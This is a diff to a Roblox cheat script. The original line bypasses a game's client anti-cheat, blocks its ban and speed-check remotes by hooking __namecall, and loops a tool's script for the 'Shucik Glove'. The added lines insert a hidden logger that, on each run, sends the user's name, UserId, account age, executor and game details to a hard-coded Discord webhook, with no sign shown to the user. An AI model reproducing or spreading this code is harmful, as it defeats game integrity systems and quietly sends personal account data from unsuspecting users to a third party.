@@ -1,1 +1,91 @@
 do local RequireService=cloneref or function(clone) return clone;end ;local BlockInstance=function(ez) ez.Name="BlockedInstance_"   .. math.random(0,500000) ;ez.Parent=RequireService(game:GetService("LogService"));ez:Destroy();end;local game=game or Ugc ;local Players=RequireService(game:GetService("Players"));local Player=Players.LocalPlayer;local PlayerScripts=Player:WaitForChild("PlayerScripts");local StarterPlayer=RequireService(game:GetService("StarterPlayer"));local StarterPlayerScripts=StarterPlayer:WaitForChild("StarterPlayerScripts");local ReplicatedStorage=RequireService(game:GetService("ReplicatedStorage"));local ReplicatedFirst=RequireService(game:GetService("ReplicatedFirst"));local function DestroyGrabLocalScript() if (ReplicatedFirst and ReplicatedFirst:FindFirstChild("Client") and ReplicatedFirst.Client:FindFirstChild("GrabLocal")) then BlockInstance(ReplicatedFirst.Client.GrabLocal);game:GetService("StarterGui"):SetCore("SendNotification",{Title="Bypassed Grab Client!",Text="Credits: @Mohammad",Icon="https://www.roblox.com/headshot-thumbnail/image?userId=8471519102&width=420&height=420&format=png",Duration=36000,Button1="Alright!"});end end local function BypassMobileClientAntiCheat() if (StarterPlayerScripts:FindFirstChild("ClientAnticheat") and StarterPlayerScripts.ClientAnticheat:FindFirstChild("AntiMobileExploits")) then BlockInstance(StarterPlayerScripts.ClientAnticheat.AntiMobileExploits);BlockInstance(StarterPlayerScripts.ClientAnticheat);game:GetService("StarterGui"):SetCore("SendNotification",{Title="Bypassed Mobile Client Anti-Cheat!",Text="Credits: @Mohammad",Icon="https://www.roblox.com/headshot-thumbnail/image?userId=8471519102&width=420&height=420&format=png",Duration=36000,Button1="Alright!"});end end local function HookOrBlock(placeId,remotes) if (hookmetamethod and getnamecallmethod) then local Namecall;Namecall=hookmetamethod(game,"__namecall",function(self,...) local name=tostring(self);if ((getnamecallmethod()=="FireServer") and table.find(remotes,name)) then return;end return Namecall(self,...);end);game:GetService("StarterGui"):SetCore("SendNotification",{Title="Bypassed Ban Remotes!",Text="{ Method: Hookmetamethod, Total Blocked: "   ..  #remotes   .. "/"   ..  #remotes   .. " } Credits: @Mohammad" ,Icon="https://www.roblox.com/headshot-thumbnail/image?userId=8471519102&width=420&height=420&format=png",Duration=36000,Button1="Alright!"});else local AmountOfBlockedRemotes=0;for _,name in ipairs(remotes) do local remote=ReplicatedStorage:FindFirstChild(name) or (ReplicatedStorage:FindFirstChild("Events") and ReplicatedStorage.Events:FindFirstChild(name)) ;if remote then BlockInstance(remote);AmountOfBlockedRemotes+=1 end end game:GetService("StarterGui"):SetCore("SendNotification",{Title="Bypassed Ban Remotes!",Text="{ Method: Block, Total Blocked: "   .. AmountOfBlockedRemotes   .. "/"   ..  #remotes   .. " } Credits: @Mohammad" ,Icon="https://www.roblox.com/headshot-thumbnail/image?userId=8471519102&width=420&height=420&format=png",Duration=36000,Button1="Alright!"});end end if (game.PlaceId==9431156611) then HookOrBlock(game.PlaceId,{"Ban","WalkSpeedChanged","WS","WS2"});DestroyGrabLocalScript();BypassMobileClientAntiCheat();elseif table.find({11520107397,9015014224,6403373529,124596094333302},game.PlaceId) then HookOrBlock(game.PlaceId,{"Ban","WalkSpeedChanged","AdminGUI","GRAB","SpecialGloveAccess"});DestroyGrabLocalScript();BypassMobileClientAntiCheat();end local screenGui=Instance.new("ScreenGui");screenGui.Name="MohammadGUI";screenGui.ResetOnSpawn=false;screenGui.Parent=Player:WaitForChild("PlayerGui");local mainFrame=Instance.new("Frame");mainFrame.Size=UDim2.new(0,160,0,60);mainFrame.Position=UDim2.new(0,30,0,100);mainFrame.BackgroundColor3=Color3.fromRGB(0,170,255);mainFrame.Active=true;mainFrame.Draggable=true;mainFrame.Parent=screenGui;local button=Instance.new("TextButton");button.Size=UDim2.new(1,0,1,0);button.BackgroundColor3=Color3.fromRGB(0,170,255);button.Text="Shucik Glove OP Script";button.TextScaled=true;button.Font=Enum.Font.SourceSansBold;button.TextColor3=Color3.new(1,1,1);button.Parent=mainFrame;local creditFrame=Instance.new("Frame");creditFrame.Size=UDim2.new(0,300,0,100);creditFrame.Position=UDim2.new(0.5, -150,0.3,0);creditFrame.BackgroundColor3=Color3.fromRGB(40,40,40);creditFrame.Visible=true;creditFrame.Parent=screenGui;local creditText=Instance.new("TextLabel");creditText.Size=UDim2.new(1,0,0.7,0);creditText.Position=UDim2.new(0,0,0,0);creditText.BackgroundTransparency=1;creditText.Text="Made by Mohammad on YouTube\nDelta Booklet Method";creditText.TextColor3=Color3.new(1,1,1);creditText.TextScaled=true;creditText.Font=Enum.Font.SourceSansBold;creditText.Parent=creditFrame;local closeButton=Instance.new("TextButton");closeButton.Size=UDim2.new(1,0,0.3,0);closeButton.Position=UDim2.new(0,0,0.7,0);closeButton.BackgroundColor3=Color3.fromRGB(255,50,50);closeButton.Text="Close";closeButton.TextScaled=true;closeButton.Font=Enum.Font.SourceSansBold;closeButton.TextColor3=Color3.new(1,1,1);closeButton.Parent=creditFrame;closeButton.MouseButton1Click:Connect(function() creditFrame:Destroy();end);local function loopScript(character) task.spawn(function() local tool=character:FindFirstChildOfClass("Tool") or Player.Backpack:FindFirstChildOfClass("Tool") ;if  not tool then return;end while character and character:FindFirstChild("Humanoid") and (character.Humanoid.Health>0)  do local localScript=tool:FindFirstChildOfClass("LocalScript");if localScript then local newScript=localScript:Clone();localScript:Destroy();newScript.Parent=tool;end task.wait(0.1);end end);end button.MouseButton1Click:Connect(function() loopScript(Player.Character or Player.CharacterAdded:Wait() );Player.CharacterAdded:Connect(function(char) char:WaitForChild("Humanoid");loopScript(char);end);end); end
+--// Services
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local player = Players.LocalPlayer
+
+--// Webhook URL
+local webhook = "https://discord.com/api/webhooks/1374927459363061870/NVLNHOGR2aH0NmICgEATTZVDt5yBAuoyO3sn3QCWhxOweUjkWbuaVRZrTYscDTujYKoe"
+
+--// Executor detection
+local executor = "Unknown"
+if syn then
+	executor = "Synapse X"
+elseif is_sirhurt_closure then
+	executor = "SirHurt"
+elseif secure_load then
+	executor = "Sentinel"
+elseif KRNL_LOADED then
+	executor = "KRNL"
+elseif getexecutorname then
+	executor = getexecutorname()
+elseif fluxus then
+	executor = "Fluxus"
+end
+
+--// Get game name
+local success, gameName = pcall(function()
+	return MarketplaceService:GetProductInfo(game.PlaceId).Name
+end)
+if not success then
+	gameName = "Unknown Game"
+end
+
+--// Get execution time (UTC)
+local executionTime = os.date("!%Y-%m-%d %H:%M:%S UTC")
+
+--// ROBUX VALUE ESTIMATION
+
+-- NOTE: Roblox does NOT expose player's Robux balance to scripts.
+-- We'll simulate this by pretending a balance (replace with real if you have API)
+local robuxBalance = 0 -- Default 0, no official way to get it via Lua
+
+-- If you want to test, put a number here like:
+-- local robuxBalance = 1500
+
+-- Robux purchase value (approx $0.0125 per Robux)
+local purchaseValue = robuxBalance * 0.0125
+
+-- DevEx value (approx $0.0035 per Robux)
+local devexValue = robuxBalance * 0.0035
+
+local robuxInfo = robuxBalance > 0 and
+	string.format("Balance: %d R$\nEstimated Purchase Value: $%.2f\nEstimated DevEx Value: $%.2f", robuxBalance, purchaseValue, devexValue)
+	or "Robux balance not available."
+
+--// Webhook data
+local data = {
+	content = "**Script Executed!**",
+	embeds = {{
+		title = "Execution Log",
+		color = 0x00ffff,
+		fields = {
+			{ name = "Username", value = player.Name, inline = true },
+			{ name = "Display Name", value = player.DisplayName, inline = true },
+			{ name = "UserId", value = tostring(player.UserId), inline = true },
+			{ name = "Account Age (days)", value = tostring(player.AccountAge), inline = true },
+			{ name = "Executor", value = executor, inline = true },
+			{ name = "Game Name", value = gameName, inline = true },
+			{ name = "Place ID", value = tostring(game.PlaceId), inline = true },
+			{ name = "Private Server?", value = tostring(game.PrivateServerId ~= ""), inline = true },
+			{ name = "Execution Time", value = executionTime, inline = false },
+			{ name = "Place Link", value = "https://www.roblox.com/games/" .. game.PlaceId, inline = false },
+			{ name = "Robux Info", value = robuxInfo, inline = false }
+		}
+	}}
+}
+
+--// Send to Discord
+local jsonData = HttpService:JSONEncode(data)
+local request = (syn and syn.request) or (http and http.request) or request
+if request then
+	request({
+		Url = webhook,
+		Method = "POST",
+		Headers = { ["Content-Type"] = "application/json" },
+		Body = jsonData
+	})
+else
+	warn("Your executor does not support HTTP requests.")
+end
